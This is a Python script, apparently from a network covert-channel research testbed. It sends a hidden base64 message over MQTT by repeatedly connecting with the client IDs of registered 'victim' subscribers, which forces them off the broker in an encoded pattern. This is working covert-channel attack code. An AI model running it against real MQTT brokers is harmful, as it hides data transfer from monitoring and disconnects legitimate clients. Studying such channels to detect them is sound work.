import random
import os
import uuid
import json
import time
import base64
from paho.mqtt import client as mqtt_client
from utilities import convert_pattern
from utilities_mqtt import mqtt_register_covert

config = { 'broker': os.environ.get('TARGET_HOST', '127.0.0.1'),
            'port': int(os.environ.get('TARGET_PORT', '1883')),
            'client_id': str(uuid.uuid4()),
            'pattern': "mqtt-15-reconnect",
            'covert_message': os.environ.get('COVERT_MESSAGE', b""),
            'covert_victims': int(os.environ.get('COVERT_VICTIMS', "2")),
            'covert_delay': float(os.environ.get('COVERT_DELAY', "3.0")),
            'used_by': None
}


def connect_mqtt(client_id) -> mqtt_client:
    def on_connect(client, userdata, flags, rc):
        if rc == 0:
            print("Connected to MQTT Broker!")
        else:
            print("Failed to connect, return code %d\n", rc)

    client = mqtt_client.Client(client_id, clean_session=True)
    # client.username_pw_set(username, password)
    client.on_connect = on_connect
    client.connect(config['broker'], config['port'])
    return client

def run(client_id):
    client = connect_mqtt(client_id)
    client.disconnect()




if __name__ == '__main__':
    time.sleep(10)
    print("Starting MQTT Covert Channel, config: {}".format(config))
    victims = mqtt_register_covert(pattern="pt15-reconnect", victim_type="subscriber", covert_id=config['client_id'], num_clients=config['covert_victims'])
    print("registered - using the following victims: {}".format(victims))
    message = base64.b64decode(config['covert_message'])
    if config['covert_victims'] < 2:
        print("not enough clients ({}), minimum: 2".format(config['covert_victims']))
        exit(1)
    
    pattern = convert_pattern(message, config['covert_victims'])
    print("len(pattern) == {}".format(len(pattern)))
    while(pattern):
        current_victim = victims[pattern[0]]
        print("value {}, victim: {}, elements left: {}".format(pattern[0], current_victim, len(pattern)))
        run(current_victim)
        pattern = pattern[1:]
        if(pattern):
            time.sleep(config['covert_delay'])

